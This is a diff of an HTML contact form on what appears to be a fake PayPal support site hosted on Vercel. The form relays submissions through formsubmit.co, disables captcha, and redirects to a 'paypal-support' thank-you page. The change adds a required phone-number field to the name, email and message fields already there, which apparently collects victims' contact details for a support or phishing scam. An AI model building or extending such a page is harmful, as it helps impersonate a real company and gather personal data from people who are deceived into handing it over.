@@ -31,15 +31,18 @@
 
       <form action="https://formsubmit.co/el/vevoci" method="POST" class="bg-white p-6 rounded shadow space-y-4">
   <input type="text" name="name" placeholder="Your Name" class="w-full p-2 border rounded" required />
+  
   <input type="email" name="email" placeholder="Your Email" class="w-full p-2 border rounded" required />
+
+  <input type="tel" name="phone" placeholder="Your Phone Number" class="w-full p-2 border rounded" required />
+
   <textarea name="message" placeholder="Your Message" class="w-full p-2 border rounded h-32" required></textarea>
 
-  <!-- Optional hidden inputs -->
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_next" value="https://paypal-support-indol.vercel.app/thank-you.html">
-  
+
   <button type="submit" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">Submit</button>
-</form>
+      </form>
 
     <section id="faq" class="mt-10">
       <h3 class="text-lg font-semibold mb-4 text-blue-700">Frequently Asked Questions</h3>
